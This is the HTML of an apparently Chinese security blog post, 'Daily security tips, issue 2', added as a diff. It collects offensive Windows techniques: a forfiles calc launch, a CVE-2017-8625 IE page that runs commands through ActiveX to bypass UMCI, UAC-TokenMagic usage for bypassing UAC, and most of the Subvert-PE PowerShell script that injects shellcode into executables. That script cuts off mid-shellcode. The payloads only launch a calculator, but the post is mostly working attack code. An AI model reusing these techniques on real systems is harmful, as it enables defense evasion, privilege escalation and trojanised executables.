@@ -1,0 +1,1116 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5">
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1">
+
+
+    <meta name="description" content="kali|linux|sec|Web|MSF|Win">
+
+
+
+  <meta name="keywords" content="每日安全干货及动态,">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demonsec" type="application/atom+xml">
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1">
+
+
+<meta name="keywords" content="每日安全干货及动态">
+<meta property="og:type" content="article">
+<meta property="og:title" content="每日安全干货及动态--第二期">
+<meta property="og:url" content="www.ggsec.cn/每日安全干货及动态-1.html">
+<meta property="og:site_name" content="Demonsec">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/850.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DA719C3B-B1BB-4833-A714-74126C52B141.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515492708640.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515493015402.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515492999613.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515493033127.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7842CEE459C87DF22D96DF1C051EE0DC.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/9A727799-C49D-4D1E-B2E1-B44668E431E6.jpg">
+<meta property="og:updated_time" content="2018-12-21T06:55:55.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="每日安全干货及动态--第二期">
+<meta name="twitter:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/850.jpg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> 每日安全干货及动态--第二期 | Demonsec </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Demonsec’S blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br>
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br>
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br>
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            <i class="menu-item-icon icon-next-linux"></i> <br>
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            <i class="menu-item-icon icon-next-windows"></i> <br>
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-haking">
+          <a href="/categories/haking" rel="section">
+            <i class="menu-item-icon icon-next-haking"></i> <br>
+            haking
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            <i class="menu-item-icon icon-next-web"></i> <br>
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            <i class="menu-item-icon icon-next-msf"></i> <br>
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            <i class="menu-item-icon icon-next-kali"></i> <br>
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tea">
+          <a href="/categories/tea" rel="section">
+            <i class="menu-item-icon icon-next-tea"></i> <br>
+            tea
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-黑苹果">
+          <a href="/categories/mac" rel="section">
+            <i class="menu-item-icon icon-next-黑苹果"></i> <br>
+            mac
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向">
+          <a href="/categories/逆向" rel="section">
+            <i class="menu-item-icon icon-next-逆向"></i> <br>
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            <i class="menu-item-icon icon-next-music"></i> <br>
+            music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-每日安全干货及动态">
+          <a href="/categories/每日安全干货及动态" rel="section">
+            <i class="menu-item-icon icon-next-每日安全干货及动态"></i> <br>
+            每日安全干货及动态
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              每日安全干货及动态--第二期
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2018-01-09T17:57:30+08:00" content="2018-01-09">
+            2018-01-09
+          </time>
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/每日安全干货及动态/" itemprop="url" rel="index">
+                  <span itemprop="name">每日安全干货及动态</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <!--
+              <a href="/每日安全干货及动态-1.html#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="每日安全干货及动态-1.html" itemprop="commentsCount"></span>
+              </a>
+              -->
+              <a href="/每日安全干货及动态-1.html#comments" itemprop="discussionUrl">
+                <span>评论</span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/850.jpg" alt="enter description here"><br><a id="more"></a></p>
+<h2 id="安全项目"><a href="#安全项目" class="headerlink" title="安全项目"></a>安全项目</h2><p> 使用Vulhub一键搭建漏洞测试靶场<br><a href="https://vulhub.org/#/index/" target="_blank" rel="noopener">https://vulhub.org/#/index/</a></p>
+<p>CVE-2017-11882<br><a href="https://github.com/unamer/CVE-2017-11882/" target="_blank" rel="noopener">https://github.com/unamer/CVE-2017-11882/</a><br>&nbsp;</p>
+<h2 id="1-Forfiles-弹计算器"><a href="#1-Forfiles-弹计算器" class="headerlink" title="1.Forfiles ( 弹计算器)"></a>1.Forfiles ( 弹计算器)</h2><pre><code>forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
+</code></pre><p><a href="https://technet.microsoft.com/zh-cn/library/cc753551(v=ws.10).aspx" target="_blank" rel="noopener">https://technet.microsoft.com/zh-cn/library/cc753551(v=ws.10).aspx</a><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DA719C3B-B1BB-4833-A714-74126C52B141.jpg" alt="enter description here"></p>
+<h3 id="演示如图："><a href="#演示如图：" class="headerlink" title="演示如图："></a>演示如图：</h3><p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515492708640.jpg" alt="enter description here"></p>
+<p> &nbsp;</p>
+<h2 id="2-CVE-2017-8625-HTML-IE"><a href="#2-CVE-2017-8625-HTML-IE" class="headerlink" title="2.CVE-2017-8625 -HTML-IE"></a>2.CVE-2017-8625 -HTML-IE</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;script type=<span class="string">"text/jscript"</span>&gt;</span><br><span class="line">var r =new ActiveXObject("Wscript.shell").Run("calc.exe"); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>使用CVE-2017-8625 – 绕过设备保护UMCI</p>
+<p><a href="https://msitpros.com/?p=3909" target="_blank" rel="noopener">https://msitpros.com/?p=3909</a></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515493015402.jpg" alt="enter description here"></p>
+<p><a href="https://enigma0x3.net/2017/08/24/umci-vs-internet-explorer-exploring-cve-2017-8625/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1503674775121" target="_blank" rel="noopener">https://enigma0x3.net/2017/08/24/umci-vs-internet-explorer-exploring-cve-2017-8625/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1503674775121</a></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515492999613.jpg" alt="enter description here"></p>
+<h3 id="演示如图：-1"><a href="#演示如图：-1" class="headerlink" title="演示如图："></a>演示如图：</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515493033127.jpg" alt="enter description here"></p>
+<p>&nbsp;</p>
+<h2 id="3-UAC-TokenMagic-ps1绕UAC"><a href="#3-UAC-TokenMagic-ps1绕UAC" class="headerlink" title="3.UAC-TokenMagic.ps1绕UAC"></a>3.UAC-TokenMagic.ps1绕UAC</h2><p><a href="https://github.com/FuzzySecurity/PowerShell-Suite" target="_blank" rel="noopener">https://github.com/FuzzySecurity/PowerShell-Suite</a></p>
+<p>参考：</p>
+<p><a href="https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html</a><br><a href="https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html</a><br><a href="https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.EXAMPLE</span> C:\PS&gt; UAC-TokenMagic -BinPath C:\Windows\System32\cmd<span class="selector-class">.exe</span> .</span><br><span class="line">EXAMPLE C:\PS&gt; UAC-TokenMagic -BinPath C:\Windows\System32\cmd<span class="selector-class">.exe</span> -Args <span class="string">"/c ca</span></span><br><span class="line"><span class="string">lc.exe"</span> -ProcPID <span class="number">1116</span></span><br><span class="line">C:\PS&gt; UAC-TokenMagic -BinPath C:\Windows\System32\cmd<span class="selector-class">.exe</span>  -ProcPID <span class="number">3624</span></span><br></pre></td></tr></table></figure>
+<h3 id="如图所示："><a href="#如图所示：" class="headerlink" title="如图所示："></a>如图所示：</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7842CEE459C87DF22D96DF1C051EE0DC.jpg" alt="enter description here"><br>&nbsp;</p>
+<h2 id="4-Subvert-PE-shellcode-Powershell-弹计算器"><a href="#4-Subvert-PE-shellcode-Powershell-弹计算器" class="headerlink" title="4.Subvert-PE-shellcode- (Powershell 弹计算器)"></a>4.Subvert-PE-shellcode- (Powershell 弹计算器)</h2><p><a href="http://www.fuzzysecurity.com/scripts/18.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/scripts/18.html</a></p>
+<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">function Subvert-PE &#123;</span><br><span class="line">&lt;#</span><br><span class="line">.SYNOPSIS</span><br><span class="line">    Inject shellcode into <span class="selector-tag">a</span> PE image while retaining the PE functionality.</span><br><span class="line">  Author: Ruben Boonen (@FuzzySec)</span><br><span class="line">    License: BSD <span class="number">3</span>-Clause</span><br><span class="line">    Required Dependencies: None</span><br><span class="line">    Optional Dependencies: None</span><br><span class="line">  </span><br><span class="line">.DESCRIPTION</span><br><span class="line">  Parse a PE image, inject shellcode at the end of the code section and dynamically patch the entry point. After the shellcode executes, program execution is handed back over to the legitimate PE entry point.</span><br><span class="line">  </span><br><span class="line"><span class="selector-class">.PARAMETER</span> Path</span><br><span class="line">    Path to portable executable.</span><br><span class="line">  </span><br><span class="line"><span class="selector-class">.PARAMETER</span> Write</span><br><span class="line">    Inject shellcode and overwrite the PE. If omitted simply display "Entry Point", "Preferred Image Base" and dump the memory at the null-byte location.</span><br><span class="line">.EXAMPLE</span><br><span class="line">    C:\PS&gt; Subvert-PE -Path C:\Path\To\PE.exe</span><br><span class="line">  </span><br><span class="line">.EXAMPLE</span><br><span class="line">    C:\PS&gt; Subvert-PE -Path C:\Path\To\PE<span class="selector-class">.exe</span> -Write</span><br><span class="line">.LINK</span><br><span class="line">  http:<span class="comment">//www.fuzzysecurity.com/</span></span><br><span class="line">#&gt;</span><br><span class="line">  param (</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">    [string]<span class="variable">$Path</span>,</span><br><span class="line">    [parameter(parametersetname=<span class="string">"Write"</span>)]</span><br><span class="line">    [switch]<span class="variable">$Write</span></span><br><span class="line">  )  </span><br><span class="line">    # Read File bytes</span><br><span class="line">    <span class="variable">$bytes</span> = [System<span class="selector-class">.IO</span><span class="selector-class">.File</span>]::ReadAllBytes(<span class="variable">$Path</span>)</span><br><span class="line">    </span><br><span class="line">    New-Variable -Option Constant -Name Magic -Value @&#123;</span><br><span class="line">            <span class="string">"010b"</span> =  <span class="string">"PE32"</span></span><br><span class="line">            <span class="string">"020b"</span> =  <span class="string">"PE32+"</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # Function courtesy of @mattifestation</span><br><span class="line">    function Local:ConvertTo-Int&#123;</span><br><span class="line">        Param(</span><br><span class="line">            [Parameter(Position = <span class="number">1</span>, Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">            [Byte[]]</span><br><span class="line">            <span class="variable">$array</span>)</span><br><span class="line">        switch (<span class="variable">$array</span>.Length)&#123;</span><br><span class="line">            # Convert to WORD &amp; DWORD</span><br><span class="line">            2 &#123; Write-Output ( [UInt16] ('0x&#123;0&#125;' -f (($array | % &#123;$_.ToString('X2')&#125;) -join '')) ) &#125;</span><br><span class="line">            4 &#123; Write-Output (  [Int32] ('0x&#123;0&#125;' -f (($array | % &#123;$_.ToString('X2')&#125;) -join '')) ) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # Offsets for calculations</span><br><span class="line">    <span class="variable">$PE</span> = ConvertTo-Int <span class="variable">$bytes</span>[<span class="number">63</span>..<span class="number">60</span>]</span><br><span class="line">    <span class="variable">$NumOfPESection</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$PE</span>+<span class="number">7</span>)..(<span class="variable">$PE</span>+<span class="number">6</span>)]</span><br><span class="line">    <span class="variable">$OptSize</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$PE</span>+<span class="number">21</span>)..(<span class="variable">$PE</span>+<span class="number">20</span>)]</span><br><span class="line">    <span class="variable">$Opt</span> = <span class="variable">$PE</span> + <span class="number">24</span></span><br><span class="line">    <span class="variable">$SecTbl</span> = <span class="variable">$Opt</span> + <span class="variable">$OptSize</span></span><br><span class="line">    </span><br><span class="line">    # Entry point offset</span><br><span class="line">    <span class="variable">$EntryPointOffset</span> = <span class="string">'&#123;0:X8&#125;'</span> -f (ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">19</span>)..(<span class="variable">$Opt</span>+<span class="number">16</span>)])</span><br><span class="line">  # Duplicate for calculating JMP later</span><br><span class="line">  <span class="variable">$EntryPointBefore</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">19</span>)..(<span class="variable">$Opt</span>+<span class="number">16</span>)]</span><br><span class="line">  echo <span class="string">"`nLegitimate Entry Point Offset:   0x$EntryPointOffset"</span></span><br><span class="line">    </span><br><span class="line">    # PE magic number</span><br><span class="line">    <span class="variable">$MagicVal</span> = <span class="variable">$Magic</span>[(<span class="string">'&#123;0:X4&#125;'</span> -f (ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">1</span>)..(<span class="variable">$Opt</span>+<span class="number">0</span>)]))]</span><br><span class="line">    # Preferred ImageBase, based on $MagicVal --&gt; PE32 (DWORD), PE32+ (QWORD)</span><br><span class="line">    If(<span class="variable">$MagicVal</span> -eq <span class="string">"PE32"</span>)&#123;</span><br><span class="line">        <span class="variable">$ImageBase</span> = <span class="string">'&#123;0:X8&#125;'</span> -f (ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">31</span>)..(<span class="variable">$Opt</span>+<span class="number">28</span>)])</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    ElseIf(<span class="variable">$MagicVal</span> -eq <span class="string">"PE32+"</span>)&#123;</span><br><span class="line">        $QWORD = ( [UInt64] ('0x&#123;0&#125;' -f ((($bytes[($Opt+30)..($Opt+24)]) | % &#123;$_.ToString('X2')&#125;) -join '')) )</span><br><span class="line">        <span class="variable">$ImageBase</span> = <span class="string">'&#123;0:X16&#125;'</span> -f <span class="variable">$QWORD</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # Preferred Image Base</span><br><span class="line">    echo <span class="string">"Preferred PE Image Base:         0x$ImageBase"</span></span><br><span class="line">    </span><br><span class="line">    # Grab "Virtual Size" and "Virtual Address" for the CODE section.</span><br><span class="line">    <span class="variable">$SecVirtualSize</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$SecTbl</span>+<span class="number">11</span>)..(<span class="variable">$SecTbl</span>+<span class="number">8</span>)]</span><br><span class="line">    <span class="variable">$SecVirtualAddress</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$SecTbl</span>+<span class="number">15</span>)..(<span class="variable">$SecTbl</span>+<span class="number">12</span>)]</span><br><span class="line">    </span><br><span class="line">    # Precise start of CODE null-byte section!</span><br><span class="line">    <span class="variable">$NullCount</span> = <span class="string">'&#123;0:X8&#125;'</span> -f (<span class="variable">$SecVirtualSize</span> + <span class="variable">$SecVirtualAddress</span>)</span><br><span class="line">  </span><br><span class="line">  # Offset in PE is different [$SecVirtualSize + $SecVirtualAddress - ($SecVirtualAddress - $SecPTRRawData)]</span><br><span class="line">  <span class="variable">$SecPTRRawData</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$SecTbl</span>+<span class="number">23</span>)..(<span class="variable">$SecTbl</span>+<span class="number">20</span>)]</span><br><span class="line">  <span class="variable">$ShellCodeWrite</span> = (<span class="variable">$SecVirtualSize</span> + <span class="variable">$SecVirtualAddress</span> - (<span class="variable">$SecVirtualAddress</span> - <span class="variable">$SecPTRRawData</span>))</span><br><span class="line">  </span><br><span class="line">  # Hexdump of null-byte padding (before)</span><br><span class="line">  echo <span class="string">"`nNull-Byte Padding dump:"</span></span><br><span class="line">  <span class="variable">$output</span> = <span class="string">""</span></span><br><span class="line">  foreach ( <span class="variable">$count</span> <span class="keyword">in</span> <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> - <span class="number">1</span>)..(<span class="variable">$ShellCodeWrite</span>+<span class="number">504</span>)] ) &#123;</span><br><span class="line">    if (($output.length%32) -eq 0)&#123;</span><br><span class="line">      <span class="variable">$output</span> += <span class="string">"`n"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$output</span> += <span class="string">"&#123;0:X2&#125; "</span> -f <span class="variable">$count</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; echo <span class="string">"$output`n"</span></span><br><span class="line">  </span><br><span class="line">    # If -Write flag is set</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$Write</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        # Set shellcode variable based on PE architecture</span><br><span class="line">        If(<span class="variable">$MagicVal</span> -eq <span class="string">"PE32"</span>)&#123;</span><br><span class="line">            # 32-bit Universal WinExe (+ restore registers) --&gt; calc (by SkyLined)</span><br><span class="line">            # Size: 76 bytes</span><br><span class="line">            <span class="variable">$ShellCode</span> = @(<span class="number">0</span>x60,<span class="number">0</span>x31,<span class="number">0</span>xD2,<span class="number">0</span>x52,<span class="number">0</span>x68,<span class="number">0</span>x63,<span 